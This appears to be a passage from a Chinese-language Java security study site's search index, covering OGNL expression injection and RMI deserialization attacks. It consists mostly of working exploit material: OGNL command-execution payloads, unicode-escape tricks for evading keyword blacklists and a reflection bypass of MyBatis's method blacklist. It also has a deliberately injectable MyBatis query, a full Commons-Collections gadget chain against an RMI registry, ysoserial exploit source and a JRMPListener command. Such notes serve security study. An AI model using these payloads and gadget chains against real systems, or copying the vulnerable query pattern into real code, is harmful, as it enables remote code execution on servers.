${(#runtimeclass=#this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod=#runtimeclass.getDeclaredMethods([7]).(#rtobj=#getruntimemethod.invoke(null,null)).(#execmethod=#runtimeclass.getDeclaredMethods([14]).(#execmethod.invoke(#rtobj,\"cmd\"))} //\u4f7f\u7528Jshell\u6267\u884cjava\u4ee3\u7801(jdk9\u53ca\u4ee5\u540e) @jdk.jshell.Jshell@create().eval('code'); \u5173\u952e\u5b57\u7ed5\u8fc7 # \u5047\u5982\u9898\u76ee\u4e2d\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fdb\u884c\u4e86\u5173\u952e\u5b57\u7684\u9ed1\u540d\u5355(\u4ee5new\u4e3a\u4f8b)\uff0c\u90a3\u4e48\u5b9e\u9645\u4e0a\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528unicode\u5b57\u7b26\u8fdb\u884c\u7ed5\u8fc7: String str = \"(\\u006eew java.lang.ProcessBuilder(new java.lang.String[]{\" calc \"})).start()\" ; Ognl . getValue ( str , null ); \u90a3\u4e48\u5047\u5982\u5b58\u5728\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f \\\\u\\d{4} \uff0c\u5c06\u5bf9\u5e94\u7684unicode\u5148\u89e3\u6790\u4e86\u4e00\u904d\uff0c\u518d\u8fdb\u884c\u9ed1\u540d\u5355\uff0c\u8fd8\u6709\u65b9\u6cd5\u7ed5\u8fc7\u5417\uff1f\u5b9e\u9645\u4e0a\u8fd9\u91cc\u53c8\u5b58\u5728\u4e00\u4e2atrick\uff0c\u5373 \\uxxxx \u4e2d\u7684u\u662f\u53ef\u4ee5\u5199\u4e00\u4e2a\u6216\u591a\u4e2a\u7684\uff0c\u5177\u4f53\u539f\u56e0\u5728\u4e8e ognl.JavaCharStream#readChar \u65b9\u6cd5\u4e2d: \u6240\u4ee5\u4e0a\u8ff0OGNL\u8868\u8fbe\u5f0f\u53ef\u4ee5\u6539\u5199\u4e3a: String str = \"(\\uuuuuuuuuuuuuuuu006eew java.lang.ProcessBuilder(new java.lang.String[]{\" calc \"})).start()\" ; Ognl . getValue ( str , null ); OGNL\u4e0emybatis # \u57fa\u4e8emybatis3.5.9\uff0c\u4e0d\u540c\u7248\u672c\u7684mybatis\u53ef\u80fd\u5b58\u5728\u5dee\u5f02 mybatis\u4e2d\u5b9e\u9645\u4e0a\u662f\u652f\u6301OGNL\u8868\u8fbe\u5f0f\u7684\uff0c\u8fd9\u6837\u5047\u5982mybatis\u5b58\u5728sql\u6ce8\u5165(\u5373\u8f93\u5165\u76f4\u63a5\u62fc\u63a5)\u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u5b9e\u9645\u4e0a\u4e5f\u5b58\u5728OGNL\u6ce8\u5165\uff0c\u53ef\u4ee5\u5b9e\u73b0RCE MyBatis\u4e2d\u53ef\u4ee5\u4f7f\u7528OGNL\u7684\u5730\u65b9\u6709\u4e24\u5904\uff1a - \u52a8\u6001SQL\u8868\u8fbe\u5f0f\u4e2d - ${param}\u53c2\u6570\u4e2d \u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50: package com.example.ezsqltest.dao ; import org.apache.ibatis.annotations.Param ; import org.apache.ibatis.jdbc.SQL ; public class UserProvider { public UserProvider () { } public String getVoteById ( @Param ( \"vid\" ) final String vid ) { String s = ( new SQL () { { this . SELECT ( \"*\" ); this . FROM ( \"users\" ); this . WHERE ( \"id = \" + vid ); } }). toString (); return s ; } } \u8fd9\u91cc\u7684vid\u662f\u7528\u6237\u7684\u8f93\u5165\uff0c\u6ca1\u6709\u7ecf\u8fc7\u4efb\u4f55\u7684\u8fc7\u6ee4\u76f4\u63a5\u62fc\u63a5\u8fdbsql\u67e5\u8be2\u4e2d\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u53ef\u4ee5\u8f93\u5165 ${1} \u6765\u4f7f\u7528OGNL\u8868\u8fbe\u5f0f\u3002 \u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728OGNL\u6ce8\u5165\u7684\uff0c\u4f46\u662f\u5047\u5982\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528 ${@java.lang.Runtime@getRuntime().exec(\"calc\")} \u8fd9\u4e2apayload\u8fdb\u884c\u6ce8\u5165\u65f6\uff0c\u4f1a\u53d1\u73b0\u547d\u4ee4\u5e76\u6ca1\u6709\u88ab\u6210\u529f\u6267\u884c\uff0c\u8fd9\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f \u7b54\u6848\u85cf\u5728 org.apache.ibatis.ognl.OgnlRuntime#invokeMethod \u65b9\u6cd5\u4e2d\uff0c\u8fd9\u91cc\u5b58\u5728\u7740\u4e00\u4e2a\u9ed1\u540d\u5355\u673a\u5236: \u5f53 useStricterInvocation\u4e3atrue\u65f6\uff0c\u9ed1\u540d\u5355\u4e2d\u7684\u7c7b(\u6216\u7ee7\u627f\u81ea\u9ed1\u540d\u5355\u4e2d\u7684\u7c7b)\u5c06\u4e0d\u80fd\u8c03\u7528\u65b9\u6cd5\uff0c\u800c useStricterInvocation\u8fd9\u4e2a\u503c\u9ed8\u8ba4\u662f\u4e3atrue\u3002 \u6240\u4ee5\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u4e00\u4e9b\u7ed5\u8fc7\u65b9\u6cd5\u8fdb\u884c\u7ed5\u8fc7\u4e86\uff0c\u4e0a\u9762\u4e5f\u63d0\u5230\u4e86\u8fd9\u4e9bpayload: //\u4f7f\u7528\u53cd\u5c04\u8c03\u7528runtime\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 $ {( # runtimeclass = # this . getClass (). forName ( \"java.lang.Runtime\" )).( # getruntimemethod = # runtimeclass . getDeclaredMethods ( [ 7 ] ).( # rtobj = # getruntimemethod . invoke ( null , null )).( # execmethod = # runtimeclass . getDeclaredMethods ( [ 14 ] ).( # execmethod . invoke ( # rtobj , \"cmd\" ))} //\u4f7f\u7528Jshell\u6267\u884cjava\u4ee3\u7801(jdk9\u53ca\u4ee5\u540e) @jdk.jshell.Jshell@create (). eval ( ' code ' ); OGNL\u4e0estruts 2 # \u540e\u8865 \u53c2\u8003\u6587\u7ae0 # https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/ https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/ https://paper.seebug.org/794/ https://blog.csdn.net/isea533/article/details/50061705","title":"OGNL"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#ognl","text":"","title":"OGNL"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#maven\u5bfc\u5165","text":"<dependency> <groupId> ognl </groupId> <artifactId> ognl </artifactId> <version> 3.1.19 </version> </dependency>","title":"maven\u5bfc\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u57fa\u672c\u8bed\u6cd5","text":"","title":"\u57fa\u672c\u8bed\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u5bf9root\u5bf9\u8c61\u7684\u8bbf\u95ee","text":"User user = new User ( \"test\" , 23 ); System . out . println ( Ognl . getValue ( \"name\" , user ));","title":"\u5bf9Root\u5bf9\u8c61\u7684\u8bbf\u95ee"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u5bf9\u4e0a\u4e0b\u6587\u5bf9\u8c61\u7684\u8bbf\u95ee","text":"Map < String , Object > context = new HashMap < String , Object > (); context . put ( \"init\" , \"hello\" ); Ognl . getValue ( \"#init\" , context , null );","title":"\u5bf9\u4e0a\u4e0b\u6587\u5bf9\u8c61\u7684\u8bbf\u95ee"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u5bf9\u9759\u6001\u53d8\u91cf\u9759\u6001\u65b9\u6cd5\u7684\u8bbf\u95ee","text":"System . out . println ( Ognl . getValue ( \"@java.lang.Runtime@getRuntime()\" , null ););","title":"\u5bf9\u9759\u6001\u53d8\u91cf/\u9759\u6001\u65b9\u6cd5\u7684\u8bbf\u95ee"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u5bf9\u65b9\u6cd5\u7684\u8bbf\u95ee","text":"System . out . println ( Ognl . getValue ( \"@java.lang.Runtime@getRuntime().exec('calc.exe');\" , null ););","title":"\u5bf9\u65b9\u6cd5\u7684\u8bbf\u95ee"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u5bf9\u6570\u7ec4\u548c\u96c6\u5408\u7684\u8bbf\u95ee","text":"User user = new User (); Map < String , Object > context = new HashMap < String , Object > (); String [] strings = { \"aa\" , \"bb\" }; ArrayList < String > list = new ArrayList < String > (); list . add ( \"aa\" ); list . add ( \"bb\" ); Map < String , String > map = new HashMap < String , String > (); map . put ( \"key1\" , \"value1\" ); map . put ( \"key2\" , \"value2\" ); context . put ( \"list\" , list ); context . put ( \"strings\" , strings ); context . put ( \"map\" , map ); System . out . println ( Ognl . getValue ( \"#strings[0]\" , context , user )); System . out . println ( Ognl . getValue ( \"#list[0]\" , context , user )); System . out . println ( Ognl . getValue ( \"#list[0 + 1]\" , context , user )); System . out . println ( Ognl . getValue ( \"#map['key1']\" , context , user )); System . out . println ( Ognl . getValue ( \"#map['key' + '2']\" , context , user ));","title":"\u5bf9\u6570\u7ec4\u548c\u96c6\u5408\u7684\u8bbf\u95ee"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u521b\u5efa\u5bf9\u8c61","text":"System . out . println ( Ognl . getValue ( \"#{'key1':'value1'}\" , null )); System . out . println ( Ognl . getValue ( \"{'key1','value1'}\" , null )); System . out . println ( Ognl . getValue ( \"new sample.ognl.User()\" , null ));","title":"\u521b\u5efa\u5bf9\u8c61"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u8868\u8fbe\u5f0f\u652f\u6301","text":"2 + 4 // \u6574\u6570\u76f8\u52a0\uff08\u540c\u65f6\u4e5f\u652f\u6301\u51cf\u6cd5\u3001\u4e58\u6cd5\u3001\u9664\u6cd5\u3001\u53d6\u4f59 [% /mod]\u3001\uff09 \"hell\" + \"lo\" // \u5b57\u7b26\u4e32\u76f8\u52a0 i++ // \u9012\u589e\u3001\u9012\u51cf i == j // \u5224\u65ad var in list // \u662f\u5426\u5728\u5bb9\u5668\u5f53\u4e2d","title":"\u8868\u8fbe\u5f0f\u652f\u6301"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#ognl\u6ce8\u5165","text":"\u7531\u4e8eOGNL\u7684\u5f3a\u5927\u4e0e\u65b9\u4fbf\u6027\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u6784\u9020\u4e00\u4e9b\u547d\u4ee4\u6267\u884c\u7684payload: //\u4f7f\u7528runtime\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 @java.lang.Runtime@getRuntime().exec(\"calc\") //\u4f7f\u7528processbuilder\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 (new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start() //\u4f7f\u7528\u53cd\u5c04\u8c03\u7528runtime\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 ${(#runtimeclass=#this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod=#runtimeclass.getDeclaredMethods([7]).(#rtobj=#getruntimemethod.invoke(null,null)).(#execmethod=#runtimeclass.getDeclaredMethods([14]).(#execmethod.invoke(#rtobj,\"cmd\"))} //\u4f7f\u7528Jshell\u6267\u884cjava\u4ee3\u7801(jdk9\u53ca\u4ee5\u540e) @jdk.jshell.Jshell@create().eval('code');","title":"OGNL\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u5173\u952e\u5b57\u7ed5\u8fc7","text":"\u5047\u5982\u9898\u76ee\u4e2d\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fdb\u884c\u4e86\u5173\u952e\u5b57\u7684\u9ed1\u540d\u5355(\u4ee5new\u4e3a\u4f8b)\uff0c\u90a3\u4e48\u5b9e\u9645\u4e0a\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528unicode\u5b57\u7b26\u8fdb\u884c\u7ed5\u8fc7: String str = \"(\\u006eew java.lang.ProcessBuilder(new java.lang.String[]{\" calc \"})).start()\" ; Ognl . getValue ( str , null ); \u90a3\u4e48\u5047\u5982\u5b58\u5728\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f \\\\u\\d{4} \uff0c\u5c06\u5bf9\u5e94\u7684unicode\u5148\u89e3\u6790\u4e86\u4e00\u904d\uff0c\u518d\u8fdb\u884c\u9ed1\u540d\u5355\uff0c\u8fd8\u6709\u65b9\u6cd5\u7ed5\u8fc7\u5417\uff1f\u5b9e\u9645\u4e0a\u8fd9\u91cc\u53c8\u5b58\u5728\u4e00\u4e2atrick\uff0c\u5373 \\uxxxx \u4e2d\u7684u\u662f\u53ef\u4ee5\u5199\u4e00\u4e2a\u6216\u591a\u4e2a\u7684\uff0c\u5177\u4f53\u539f\u56e0\u5728\u4e8e ognl.JavaCharStream#readChar \u65b9\u6cd5\u4e2d: \u6240\u4ee5\u4e0a\u8ff0OGNL\u8868\u8fbe\u5f0f\u53ef\u4ee5\u6539\u5199\u4e3a: String str = \"(\\uuuuuuuuuuuuuuuu006eew java.lang.ProcessBuilder(new java.lang.String[]{\" calc \"})).start()\" ; Ognl . getValue ( str , null );","title":"\u5173\u952e\u5b57\u7ed5\u8fc7"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#ognl\u4e0emybatis","text":"\u57fa\u4e8emybatis3.5.9\uff0c\u4e0d\u540c\u7248\u672c\u7684mybatis\u53ef\u80fd\u5b58\u5728\u5dee\u5f02 mybatis\u4e2d\u5b9e\u9645\u4e0a\u662f\u652f\u6301OGNL\u8868\u8fbe\u5f0f\u7684\uff0c\u8fd9\u6837\u5047\u5982mybatis\u5b58\u5728sql\u6ce8\u5165(\u5373\u8f93\u5165\u76f4\u63a5\u62fc\u63a5)\u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u5b9e\u9645\u4e0a\u4e5f\u5b58\u5728OGNL\u6ce8\u5165\uff0c\u53ef\u4ee5\u5b9e\u73b0RCE MyBatis\u4e2d\u53ef\u4ee5\u4f7f\u7528OGNL\u7684\u5730\u65b9\u6709\u4e24\u5904\uff1a - \u52a8\u6001SQL\u8868\u8fbe\u5f0f\u4e2d - ${param}\u53c2\u6570\u4e2d \u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50: package com.example.ezsqltest.dao ; import org.apache.ibatis.annotations.Param ; import org.apache.ibatis.jdbc.SQL ; public class UserProvider { public UserProvider () { } public String getVoteById ( @Param ( \"vid\" ) final String vid ) { String s = ( new SQL () { { this . SELECT ( \"*\" ); this . FROM ( \"users\" ); this . WHERE ( \"id = \" + vid ); } }). toString (); return s ; } } \u8fd9\u91cc\u7684vid\u662f\u7528\u6237\u7684\u8f93\u5165\uff0c\u6ca1\u6709\u7ecf\u8fc7\u4efb\u4f55\u7684\u8fc7\u6ee4\u76f4\u63a5\u62fc\u63a5\u8fdbsql\u67e5\u8be2\u4e2d\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u53ef\u4ee5\u8f93\u5165 ${1} \u6765\u4f7f\u7528OGNL\u8868\u8fbe\u5f0f\u3002 \u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728OGNL\u6ce8\u5165\u7684\uff0c\u4f46\u662f\u5047\u5982\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528 ${@java.lang.Runtime@getRuntime().exec(\"calc\")} \u8fd9\u4e2apayload\u8fdb\u884c\u6ce8\u5165\u65f6\uff0c\u4f1a\u53d1\u73b0\u547d\u4ee4\u5e76\u6ca1\u6709\u88ab\u6210\u529f\u6267\u884c\uff0c\u8fd9\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f \u7b54\u6848\u85cf\u5728 org.apache.ibatis.ognl.OgnlRuntime#invokeMethod \u65b9\u6cd5\u4e2d\uff0c\u8fd9\u91cc\u5b58\u5728\u7740\u4e00\u4e2a\u9ed1\u540d\u5355\u673a\u5236: \u5f53 useStricterInvocation\u4e3atrue\u65f6\uff0c\u9ed1\u540d\u5355\u4e2d\u7684\u7c7b(\u6216\u7ee7\u627f\u81ea\u9ed1\u540d\u5355\u4e2d\u7684\u7c7b)\u5c06\u4e0d\u80fd\u8c03\u7528\u65b9\u6cd5\uff0c\u800c useStricterInvocation\u8fd9\u4e2a\u503c\u9ed8\u8ba4\u662f\u4e3atrue\u3002 \u6240\u4ee5\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u4e00\u4e9b\u7ed5\u8fc7\u65b9\u6cd5\u8fdb\u884c\u7ed5\u8fc7\u4e86\uff0c\u4e0a\u9762\u4e5f\u63d0\u5230\u4e86\u8fd9\u4e9bpayload: //\u4f7f\u7528\u53cd\u5c04\u8c03\u7528runtime\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 $ {( # runtimeclass = # this . getClass (). forName ( \"java.lang.Runtime\" )).( # getruntimemethod = # runtimeclass . getDeclaredMethods ( [ 7 ] ).( # rtobj = # getruntimemethod . invoke ( null , null )).( # execmethod = # runtimeclass . getDeclaredMethods ( [ 14 ] ).( # execmethod . invoke ( # rtobj , \"cmd\" ))} //\u4f7f\u7528Jshell\u6267\u884cjava\u4ee3\u7801(jdk9\u53ca\u4ee5\u540e) @jdk.jshell.Jshell@create (). eval ( ' code ' );","title":"OGNL\u4e0emybatis"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#ognl\u4e0estruts-2","text":"\u540e\u8865","title":"OGNL\u4e0estruts 2"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/#\u53c2\u8003\u6587\u7ae0","text":"https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/ https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/ https://paper.seebug.org/794/ https://blog.csdn.net/isea533/article/details/50061705","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/","tags":["java","java\u5b89\u5168"],"text":"RMI # \u6211\u4eec\u77e5\u9053RMI\u5728\u6574\u4e2a\u8c03\u7528\u6d41\u7a0b\u65f6\u90fd\u4f1a\u51fa\u73b0\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece\u4e2d\u5229\u7528\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u653b\u51fb\u65b9\u6cd5 # \u670d\u52a1\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3 # \u5f53\u670d\u52a1\u7aef\u5728bind\u65f6\uff0c\u5b9e\u9645\u4e0a\u4e5f\u662f\u5411\u6ce8\u518c\u4e2d\u5fc3\u5e8f\u5217\u5316\u4f20\u8f93\u5bf9\u8c61\uff0c\u6ce8\u518c\u4e2d\u5fc3\u518d\u5c06\u5176\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u6765\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3(JEP 290\u4e4b\u524d)\u3002 \u6ce8\u518c\u4e2d\u5fc3\u4ee3\u7801: package top.longlone.RMIStudy ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; public class RMIRegistry { public static void main ( String [] args ) { try { LocateRegistry . createRegistry ( 2099 ); } catch ( RemoteException e ) { e . printStackTrace (); } while ( true ) ; } } \u670d\u52a1\u5668\u6784\u9020\u4e00\u4e2a\u6076\u610f\u5bf9\u8c61\u5e76\u5c06\u5176\u4f20\u8f93\u7ed9\u6ce8\u518c\u4e2d\u5fc3\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e2a\u5bf9\u8c61\u9700\u8981\u5b9e\u73b0\u4e86Remote\u63a5\u53e3\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u4f7f\u7528\u4e86\u52a8\u6001\u4ee3\u7406\u7684\u6280\u672f\uff0c\u5c06\u6076\u610f\u7684\u7c7b\u5957\u5728AnnotationInvocationHandler\u7684map\u4e2d\uff0c\u518d\u52a8\u6001\u4ee3\u7406\u5b9e\u73b0Remote\u63a5\u53e3\u4f7f\u7528: package top.longlone.RMIStudy ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import javax.management.BadAttributeValueExpException ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Proxy ; import java.rmi.Remote ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; import java.rmi.registry.Registry ; import java.util.HashMap ; import java.util.Map ; public class HelloServer { public static void main ( String [] args ) throws Exception { try { Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), }; Transformer transformer = new ChainedTransformer ( transformers ); Map innerMap = new HashMap (); Map ouputMap = LazyMap . decorate ( innerMap , transformer ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( ouputMap , \"pwn\" ); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException ( null ); Field field = badAttributeValueExpException . getClass (). getDeclaredField ( \"val\" ); field . setAccessible ( true ); field . set ( badAttributeValueExpException , tiedMapEntry ); Map tmpMap = new HashMap (); tmpMap . put ( \"pwn\" , badAttributeValueExpException ); Constructor <?> ctor = null ; ctor = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ). getDeclaredConstructor ( Class . class , Map . class ); ctor . setAccessible ( true ); InvocationHandler invocationHandler = ( InvocationHandler ) ctor . newInstance ( Override . class , tmpMap ); Remote remote = Remote . class . cast ( Proxy . newProxyInstance ( HelloServer . class . getClassLoader (), new Class [] { Remote . class }, invocationHandler )); Registry registry = LocateRegistry . getRegistry ( 2099 ); registry . bind ( \"hello1\" , remote ); } catch ( Exception e ) { e . printStackTrace (); } } } \u653b\u51fb\u6d41\u7a0b # \u5f00\u542f\u6ce8\u518c\u4e2d\u5fc3 \u8fd0\u884c\u670d\u52a1\u7aef\u4ee3\u7801 \u6ce8\u518c\u4e2d\u5fc3\u53cd\u5e8f\u5217\u5316\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668 \u5176\u89e6\u53d1\u7684\u53cd\u5e8f\u5217\u5316\u4f4d\u7f6e\u5728 sun.rmi.registry.RegistryImpl_Skel#dispatch : \u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u670d\u52a1\u7aef # \u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 \u6839\u636e\u4e0a\u6587\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86 registry.bind \uff0c\u5176\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u539f\u751f\u7684 RegistryImpl_Stub \uff0c\u4f1a\u89e6\u53d1 UnicastRef#invoke->StreamRemoteCall#executeCall \u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\uff0c\u4e5f\u5c31\u662f\u8bf4\u5f53\u6211\u4eec\u670d\u52a1\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3\u65f6\u6ce8\u518c\u4e2d\u5fc3\u4e5f\u53ef\u80fd\u4f1a\u5bf9\u6211\u4eec\u8fdb\u884c\u653b\u51fb\u3002 \u6bd4\u5982\u6211\u4eec\u5e38\u7528\u7684ysoserial\u4e2d\u7684 RMIRegistryExploit \uff0c\u5176\u4ee3\u7801\u5982\u4e0b: public static void main ( final String [] args ) throws Exception { final String host = args [ 0 ] ; final int port = Integer . parseInt ( args [ 1 ] ); final String command = args [ 3 ] ; Registry registry = LocateRegistry . getRegistry ( host , port ); final String className = CommonsCollections1 . class . getPackage (). getName () + \".\" + args [ 2 ] ; final Class <? extends ObjectPayload > payloadClass = ( Class <? extends ObjectPayload > ) Class . forName ( className ); // test RMI registry connection and upgrade to SSL connection on fail try { registry . list (); } catch ( ConnectIOException ex ) { registry = LocateRegistry . getRegistry ( host , port , new RMISSLClientSocketFactory ()); } // ensure payload doesn't detonate during construction or deserialization exploit ( registry , payloadClass , command ); } public static void exploit ( final Registry registry , final Class <? extends ObjectPayload > payloadClass , final String command ) throws Exception { new ExecCheckingSecurityManager (). callWrapped ( new Callable < Void > (){ public Void call () throws Exception { ObjectPayload payloadObj = payloadClass . newInstance (); Object payload = payloadObj . getObject ( command ); String name = \"pwned\" + System . nanoTime (); Remote remote = Gadgets . createMemoitizedProxy ( Gadgets . createMap ( name , payload ), Remote . class ); try { registry . bind ( name , remote ); } catch ( Throwable e ) { e . printStackTrace (); } Utils . releasePayload ( payloadObj , payload ); return null ; }}); } \u53ef\u4ee5\u770b\u5230ysoserial\u4e5f\u4f7f\u7528\u4e86 registry.list \u548c registry.bind \uff0c\u6240\u4ee5\u4e5f\u5b58\u5728\u6f0f\u6d1e\u3002 \u653b\u51fb\u6d41\u7a0b # \u4f7f\u7528ysoserial\u542f\u52a8\u4e00\u4e2a\u6076\u610f\u7684\u6ce8\u518c\u4e2d\u5fc3: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe \u7a0d\u5fae\u4fee\u6539\u4e0a\u9762\u7684\u670d\u52a1\u7aef\u4ee3\u7801\uff0c\u5c06\u547d\u4ee4\u6267\u884c\u6539\u4e3a notepad.exe \uff0c\u7136\u540e\u8fd0\u884c \u670d\u52a1\u7aef\u53cd\u5e8f\u5217\u5316\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668(\u800c\u975e\u8bb0\u4e8b\u672c) ysoserial\u53cd\u5236\u4e0e\u9632\u8303 # \u6839\u636e\u4e0a\u6587\u6240\u8bf4\uff0c\u6ce8\u518c\u4e2d\u5fc3\u548c\u670d\u52a1\u7aef\u5b9e\u9645\u4e0a\u662f\u80fd\u591f\u4e92\u76f8\u653b\u51fb\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5f53\u6211\u4eec\u653b\u51fb\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e5f\u53ef\u80fd\u906d\u53d7\u653b\u51fb\u3002 \u90a3\u4e48\u6211\u4eec\u8981\u5982\u4f55\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u5462\uff1f\u7b54\u6848\u662f\u7528socket\u6a21\u62dfJRMP\u534f\u8bae\u53d1\u5305\uff0c\u5176\u5b9e\u4e0e\u540e\u9762\u6587\u7ae0\u4e2d \u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3 \u7684ysoserial\u4e2dexploit/JRMPClient\u7684\u4ee3\u7801\u7c7b\u4f3c\uff0c\u53ea\u662f\u6211\u4eec\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u70b9\u7684\u65b9\u5f0f\u4e0d\u4e00\u6837\u3002 \u8fd9\u91cc\u4e5f\u53c2\u8003\u4e86 attack-rmi-registry-and-server-with-socket \u4e0eysoserial\u4e2dexploit/JRMPClient\u7684\u4ee3\u7801\uff0c\u7a0d\u4f5c\u4fee\u6539\u5373\u53ef\uff0c\u901a\u8fc7\u624b\u52a8\u6a21\u62dfJRMP\u53d1\u5305\u4f5c\u4e3a\u6076\u610f\u670d\u52a1\u7aef\u53d1\u9001\u4e00\u4e2abind\u8bf7\u6c42\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3\uff0c\u9632\u6b62\u4e86\u53cd\u5236\u3002 package top.longlone.RMIStudy ; import sun.rmi.server.MarshalOutputStream ; import sun.rmi.transport.TransportConstants ; import top.longlone.CC5 ; import javax.net.SocketFactory ; import java.io.DataOutputStream ; import java.io.ObjectOutputStream ; import java.io.OutputStream ; import java.net.InetSocketAddress ; import java.net.Socket ; public class JRMPRegistryExploit { public static void main ( String [] args ) throws Exception { if ( args . length == 0 ) { // 